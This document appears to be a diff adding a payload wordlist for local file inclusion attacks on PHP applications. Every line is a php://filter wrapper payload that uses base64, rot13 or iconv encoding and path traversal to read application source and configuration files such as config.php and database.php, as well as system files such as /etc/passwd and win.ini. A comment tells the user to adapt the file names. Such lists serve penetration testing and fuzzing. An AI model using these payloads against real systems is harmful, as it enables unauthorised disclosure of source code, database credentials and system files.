@@ -1,0 +1,31 @@
+# Change the resources file name. the below are default file names only
+php://filter/read=convert.base64-encode/resource=index
+php://filter/read=convert.base64-encode/resource=home
+php://filter/read=convert.base64-encode/resource=admin
+php://filter/read=convert.base64-encode/resource=config
+php://filter/read=convert.base64-encode/resource=database
+php://filter/read=convert.base64-encode/resource=../config
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=../../../../win.ini
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=/etc/hosts
+php://filter/convert.base64-encode/resource=index
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=index
+php://filter/string.rot13/resource=index
+php://filter/read=convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index
+#
+# With file extension
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=home.php
+php://filter/read=convert.base64-encode/resource=admin.php
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=database.php
+php://filter/read=convert.base64-encode/resource=../config.php
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+php://filter/read=convert.base64-encode/resource=../../../../win.ini
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=/etc/hosts
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
+php://filter/string.rot13/resource=index.php
+php://filter/read=convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index.php
